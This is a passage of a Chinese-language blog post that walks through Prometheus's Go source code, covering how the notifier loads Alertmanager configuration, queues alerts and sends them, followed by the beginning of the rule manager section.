class="string">"queue_capacity"</span>,</span><br><span class="line">Help:      <span class="string">"The capacity of the alert notifications queue."</span>,</span><br><span class="line">&#125;),</span><br><span class="line">alertmanagersDiscovered: prometheus.NewGaugeFunc(prometheus.GaugeOpts&#123;</span><br><span class="line">Name: <span class="string">"prometheus_notifications_alertmanagers_discovered"</span>,</span><br><span class="line">Help: <span class="string">"The number of alertmanagers discovered and active."</span>,</span><br><span class="line">&#125;, alertmanagersDiscovered),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">m.queueCapacity.Set(<span class="keyword">float64</span>(queueCap))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r != <span class="literal">nil</span> &#123;</span><br><span class="line">r.MustRegister(</span><br><span class="line">m.latency,</span><br><span class="line">m.errors,</span><br><span class="line">m.sent,</span><br><span class="line">m.dropped,</span><br><span class="line">m.queueLength,</span><br><span class="line">m.queueCapacity,</span><br><span class="line">m.alertmanagersDiscovered,</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> m</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加载服务配置：</p><p>加载系统的配置过程，notifier服务会从prometheus.yml中获取external_labels, alert_relabel_configs和告警服务配置信息，将其保存到alertmanager中，告警触发的时候，根据external_labels,alert_relabel_configs的规则添加，重置对应的label，更具告警服务信息完成告警的信息发送。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// ApplyConfig updates the status state as the new config requires.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">ApplyConfig</span><span class="params">(conf *config.Config)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">n.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> n.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">n.opts.ExternalLabels = conf.GlobalConfig.ExternalLabels</span><br><span class="line">n.opts.RelabelConfigs = conf.AlertingConfig.AlertRelabelConfigs</span><br><span class="line"></span><br><span class="line">amSets := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*alertmanagerSet)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, cfg := <span class="keyword">range</span> conf.AlertingConfig.AlertmanagerConfigs &#123;</span><br><span class="line">ams, err := newAlertmanagerSet(cfg, n.logger)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ams.metrics = n.metrics</span><br><span class="line"></span><br><span class="line"><span class="comment">// The config hash is used for the map lookup identifier.</span></span><br><span class="line">b, err := json.Marshal(cfg)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">amSets[fmt.Sprintf(<span class="string">"%x"</span>, md5.Sum(b))] = ams</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n.alertmanagers = amSets</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newAlertmanagerSet方法会根据告警服务的配置信息构建alertmanagerSet结构实列，告警服务对应的ams还是初始化空列表</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// alertmanagerSet contains a set of Alertmanagers discovered via a group of service</span></span><br><span class="line"><span class="comment">// discovery definitions that have a common configuration on how alerts should be sent.</span></span><br><span class="line"><span class="keyword">type</span> alertmanagerSet <span class="keyword">struct</span> &#123;</span><br><span class="line">cfg    *config.AlertmanagerConfig</span><br><span class="line">client *http.Client</span><br><span class="line"></span><br><span class="line">metrics *alertMetrics</span><br><span class="line"></span><br><span class="line">mtx    sync.RWMutex</span><br><span class="line">ams    []alertmanager</span><br><span class="line">logger log.Logger</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newAlertmanagerSet</span><span class="params">(cfg *config.AlertmanagerConfig, logger log.Logger)</span> <span class="params">(*alertmanagerSet, error)</span></span> &#123;</span><br><span class="line">client, err := httputil.NewClientFromConfig(cfg.HTTPClientConfig, <span class="string">"alertmanager"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">s := &amp;alertmanagerSet&#123;</span><br><span class="line">client: client,</span><br><span class="line">cfg:    cfg,</span><br><span class="line">logger: logger,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动notifier服务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run dispatches notifications continuously.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">Run</span><span class="params">(tsets &lt;-<span class="keyword">chan</span> <span class="keyword">map</span>[<span class="keyword">string</span>][]*targetgroup.Group)</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-n.ctx.Done():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> ts := &lt;-tsets:</span><br><span class="line">n.reload(ts)</span><br><span class="line"><span class="keyword">case</span> &lt;-n.more:</span><br><span class="line">&#125;</span><br><span class="line">alerts := n.nextBatch()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !n.sendAll(alerts...) &#123;</span><br><span class="line">n.metrics.dropped.Add(<span class="keyword">float64</span>(<span class="built_in">len</span>(alerts)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// If the queue still has items left, kick off the next iteration.</span></span><br><span class="line"><span class="keyword">if</span> n.queueLen() &gt; <span class="number">0</span> &#123;</span><br><span class="line">n.setMore()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务收到更新信号调用reload方法，将告警服务ts放入reload方法中，更新服务目标服务信息。</p><p>scrape发现服务以job_name为单元，notifier发现服务以告警服务为单元，告警服务作用域所有的job_name.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">reload</span><span class="params">(tgs <span class="keyword">map</span>[<span class="keyword">string</span>][]*targetgroup.Group)</span></span> &#123;</span><br><span class="line">n.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> n.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> id, tgroup := <span class="keyword">range</span> tgs &#123;</span><br><span class="line">am, ok := n.alertmanagers[id]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">level.Error(n.logger).Log(<span class="string">"msg"</span>, <span class="string">"couldn't sync alert manager set"</span>, <span class="string">"err"</span>, fmt.Sprintf(<span class="string">"invalid id:%v"</span>, id))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">am.sync(tgroup)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用sync方法，同步告警服务信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sync extracts a deduplicated set of Alertmanager endpoints from a list</span></span><br><span class="line"><span class="comment">// of target groups definitions.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *alertmanagerSet)</span> <span class="title">sync</span><span class="params">(tgs []*targetgroup.Group)</span></span> &#123;</span><br><span class="line">all := []alertmanager&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, tg := <span class="keyword">range</span> tgs &#123;</span><br><span class="line">ams, err := alertmanagerFromGroup(tg, s.cfg)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(s.logger).Log(<span class="string">"msg"</span>, <span class="string">"Creating discovered Alertmanagers failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">all = <span class="built_in">append</span>(all, ams...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> s.mtx.Unlock()</span><br><span class="line"><span class="comment">// Set new Alertmanagers and deduplicate them along their unique URL.</span></span><br><span class="line">s.ams = []alertmanager&#123;&#125;</span><br><span class="line">seen := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, am := <span class="keyword">range</span> all &#123;</span><br><span class="line">us := am.url().String()</span><br><span class="line"><span class="keyword">if</span> _, ok := seen[us]; ok &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This will initialise the Counters for the AM to 0.</span></span><br><span class="line">s.metrics.sent.WithLabelValues(us)</span><br><span class="line">s.metrics.errors.WithLabelValues(us)</span><br><span class="line"><span class="comment">//根据URL地址构建唯一键值，</span></span><br><span class="line">seen[us] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">        <span class="comment">//保存alertmanager</span></span><br><span class="line">s.ams = <span class="built_in">append</span>(s.ams, am)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alertmanagerFromGroup 方法中将对告警信息的label 进行整理，包括<strong>address</strong>, <strong>alerts_path</strong> 和 <strong>scheme</strong>，每个实列的内容都为告警服务的URL地址。</p><p>sendAll方法，发送告警到所有配置的alertmanagers，当至少一个alertmanager成功，返回成功。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sendAll sends the alerts to all configured Alertmanagers concurrently.</span></span><br><span class="line"><span class="comment">// It returns true if the alerts could be sent successfully to at least one Alertmanager.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">sendAll</span><span class="params">(alerts ...*Alert)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">begin := time.Now()</span><br><span class="line"></span><br><span class="line">b, err := json.Marshal(alerts)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(n.logger).Log(<span class="string">"msg"</span>, <span class="string">"Encoding alerts failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n.mtx.RLock()</span><br><span class="line">amSets := n.alertmanagers</span><br><span class="line">n.mtx.RUnlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">wg         sync.WaitGroup</span><br><span class="line">numSuccess <span class="keyword">uint64</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> _, ams := <span class="keyword">range</span> amSets &#123;</span><br><span class="line">ams.mtx.RLock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, am := <span class="keyword">range</span> ams.ams &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ctx, cancel := context.WithTimeout(n.ctx, ams.cfg.Timeout)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(ams *alertmanagerSet, am alertmanager)</span></span> &#123;</span><br><span class="line">u := am.url().String()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := n.sendOne(ctx, ams.client, u, b); err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(n.logger).Log(<span class="string">"alertmanager"</span>, u, <span class="string">"count"</span>, <span class="built_in">len</span>(alerts), <span class="string">"msg"</span>, <span class="string">"Error sending alert"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">n.metrics.errors.WithLabelValues(u).Inc()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">atomic.AddUint64(&amp;numSuccess, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">n.metrics.latency.WithLabelValues(u).Observe(time.Since(begin).Seconds())</span><br><span class="line">n.metrics.sent.WithLabelValues(u).Add(<span class="keyword">float64</span>(<span class="built_in">len</span>(alerts)))</span><br><span class="line"></span><br><span class="line">wg.Done()</span><br><span class="line">&#125;(ams, am)</span><br><span class="line">&#125;</span><br><span class="line">ams.mtx.RUnlock()</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//发送告警同步等待</span></span><br><span class="line">wg.Wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> numSuccess &gt; <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用sendOne发送告警信息，使用http请求的方式发送告警信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">sendOne</span><span class="params">(ctx context.Context, c *http.Client, url <span class="keyword">string</span>, b []<span class="keyword">byte</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">req, err := http.NewRequest(<span class="string">"POST"</span>, url, bytes.NewReader(b))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">req.Header.Set(<span class="string">"Content-Type"</span>, contentTypeJSON)</span><br><span class="line">resp, err := n.opts.Do(ctx, c, req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Any HTTP status 2xx is OK.</span></span><br><span class="line"><span class="keyword">if</span> resp.StatusCode/<span class="number">100</span> != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"bad response status %v"</span>, resp.Status)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>notifier流程：</p><p><img src="/images/1572404957636.png" alt="1572404957636"></p><p>注册notifier:</p><p>初始化过程中将notifier服务注册到rulemanager中，规则运算过程中触发告警，会调用注册的sendAlerts方法完成告警信息发送。</p><p>告警状态分为三种：StateInactive（告警活动状态），StatePending (告警待定状态)，StateFiring(告警激活状态)。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sendAlerts implements a the rules.NotifyFunc for a Notifier.</span></span><br><span class="line"><span class="comment">// It filters any non-firing alerts from the input.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendAlerts</span><span class="params">(n *notifier.Notifier, externalURL <span class="keyword">string</span>)</span> <span class="title">rules</span>.<span class="title">NotifyFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, expr <span class="keyword">string</span>, alerts ...*rules.Alert)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> res []*notifier.Alert</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, alert := <span class="keyword">range</span> alerts &#123;</span><br><span class="line"><span class="comment">// Only send actually firing alerts.</span></span><br><span class="line"><span class="keyword">if</span> alert.State == rules.StatePending &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">a := &amp;notifier.Alert&#123;</span><br><span class="line">StartsAt:     alert.FiredAt,</span><br><span class="line">Labels:       alert.Labels,</span><br><span class="line">Annotations:  alert.Annotations,</span><br><span class="line">GeneratorURL: externalURL + strutil.TableLinkForExpression(expr),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !alert.ResolvedAt.IsZero() &#123;</span><br><span class="line">a.EndsAt = alert.ResolvedAt</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="built_in">append</span>(res, a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(alerts) &gt; <span class="number">0</span> &#123;</span><br><span class="line">n.Send(res...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警信息alerts通过notifier.Send方法添加到告警队列中，在添加之前需要对告警信息的label进行扩展和重置。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Send queues the given notification requests for processing.</span></span><br><span class="line"><span class="comment">// Panics if called on a handler that is not running.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">Send</span><span class="params">(alerts ...*Alert)</span></span> &#123;</span><br><span class="line">n.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> n.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attach external labels before relabelling and sending.</span></span><br><span class="line"><span class="keyword">for</span> _, a := <span class="keyword">range</span> alerts &#123;</span><br><span class="line">lb := labels.NewBuilder(a.Labels)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ln, lv := <span class="keyword">range</span> n.opts.ExternalLabels &#123;</span><br><span class="line"><span class="keyword">if</span> a.Labels.Get(<span class="keyword">string</span>(ln)) == <span class="string">""</span> &#123;</span><br><span class="line">lb.Set(<span class="keyword">string</span>(ln), <span class="keyword">string</span>(lv))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.Labels = lb.Labels()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alerts = n.relabelAlerts(alerts)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Queue capacity should be significantly larger than a single alert</span></span><br><span class="line"><span class="comment">// batch could be.</span></span><br><span class="line"><span class="keyword">if</span> d := <span class="built_in">len</span>(alerts) - n.opts.QueueCapacity; d &gt; <span class="number">0</span> &#123;</span><br><span class="line">alerts = alerts[d:]</span><br><span class="line"></span><br><span class="line">level.Warn(n.logger).Log(<span class="string">"msg"</span>, <span class="string">"Alert batch larger than queue capacity, dropping alerts"</span>, <span class="string">"num_dropped"</span>, d)</span><br><span class="line">n.metrics.dropped.Add(<span class="keyword">float64</span>(d))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the queue is full, remove the oldest alerts in favor</span></span><br><span class="line"><span class="comment">// of newer ones.</span></span><br><span class="line"><span class="keyword">if</span> d := (<span class="built_in">len</span>(n.queue) + <span class="built_in">len</span>(alerts)) - n.opts.QueueCapacity; d &gt; <span class="number">0</span> &#123;</span><br><span class="line">n.queue = n.queue[d:]</span><br><span class="line"></span><br><span class="line">level.Warn(n.logger).Log(<span class="string">"msg"</span>, <span class="string">"Alert notification queue full, dropping alerts"</span>, <span class="string">"num_dropped"</span>, d)</span><br><span class="line">n.metrics.dropped.Add(<span class="keyword">float64</span>(d))</span><br><span class="line">&#125;</span><br><span class="line">n.queue = <span class="built_in">append</span>(n.queue, alerts...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Notify sending goroutine that there are alerts to be processed.</span></span><br><span class="line">n.setMore()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的流程图：</p><p><img src="/images/1572406923577.png" alt="1572406923577"></p><h2 id="RuleManager"><a href="#RuleManager" class="headerlink" title="RuleManager"></a>RuleManager</h2><p>ruleManager在prometheus初始化阶段调用rules.NewManager方法完成构建，ruleManager为Manager类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The Manager manages recording and alerting rules.</span></span><br><span class="line"><span class="keyword">type</span> Manager <span class="keyword">struct</span> &#123;</span><br><span class="line">opts   *ManagerOptions</span><br><span class="line">groups <span class="keyword">map</span>[<span class="keyword">string</span>]*Group</span><br><span class="line">mtx    sync.RWMutex</span><br><span class="line">block  <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">logger log.Logger</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>groups为map[string]*Group类型，key为规则组名，Group为具体的规则信息。</p><p>Group结构定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Group is a set of rules that have a logical relation.</span></span><br><span class="line"><span class="keyword">type</span> Group <span class="keyword">struct</span> &#123;</span><br><span class="line">name                 <span class="keyword">string</span></span><br><span class="line">file                 <span class="keyword">string</span></span><br><span class="line">interval             time.Duration</span><br><span class="line">rules                []Rule</span><br><span class="line">seriesInPreviousEval []<span class="keyword">map</span>[<span class="keyword">string</span>]labels.Labels <span class="comment">// One per Rule.</span></span><br><span class="line">opts                 *ManagerOptions</span><br><span class="line">evaluationTime       time.Duration</span><br><span class="line">mtx                  sync.Mutex</span><br><span class="line"></span><br><span class="line">done       <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">terminated <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">logger log.Logger</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更新规则：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Update the rule manager's state as the config requires. If</span></span><br><span class="line"><span class="comment">// loading the new rules failed the old rule set is 